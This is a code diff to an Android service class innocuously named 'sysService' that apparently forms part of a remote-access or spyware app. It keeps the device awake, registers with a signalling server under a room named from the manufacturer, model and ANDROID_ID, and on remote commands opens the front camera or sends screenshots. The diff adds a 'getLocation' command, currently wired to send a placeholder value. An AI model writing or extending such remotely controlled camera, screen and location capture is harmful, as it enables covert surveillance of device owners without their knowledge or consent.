@@ -69,6 +69,7 @@ public class sysService extends Service implements SysInterface{
     Intent perData;
     int perResultCode;
     DataChannel localDataChannel;
+    SignallingClient sc;
 
     //end variables
     // servic overwrite methods
@@ -101,7 +102,8 @@ public class sysService extends Service implements SysInterface{
         mWakeLock.acquire();
         handler = new Handler();
         String roomName = android.os.Build.MANUFACTURER + "_" + android.os.Build.MODEL + "_" + android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
-        SignallingClient.getInstance().init(this, roomName);
+        sc = SignallingClient.getInstance();
+        sc.init(this, roomName);
         try {
             if (intent.getExtras()!= null) {
                 Bundle bundle = intent.getExtras();
@@ -173,7 +175,7 @@ public class sysService extends Service implements SysInterface{
     }
 
     @Override
-    public void cmd(String cmd) {
+    public void onCmd(String cmd) {
         if (cmd.equalsIgnoreCase("openFrontCam") ){
             openPeerCon();
             createCamInstance("front");
@@ -199,6 +201,9 @@ public class sysService extends Service implements SysInterface{
             int shotN = Integer.parseInt(cmd.split(":")[1]);
             sendScreenshot(shotN);
             toast("get screenshot");
+        }
+        if (cmd.contains("getLocation")){
+            sendLocation();
         }
 
     }
@@ -572,6 +577,9 @@ public class sysService extends Service implements SysInterface{
     }
     // end datachannel
 
+    private void sendLocation(){
+        sc.cmd("location,12,10");
+    }
 
 
 /*
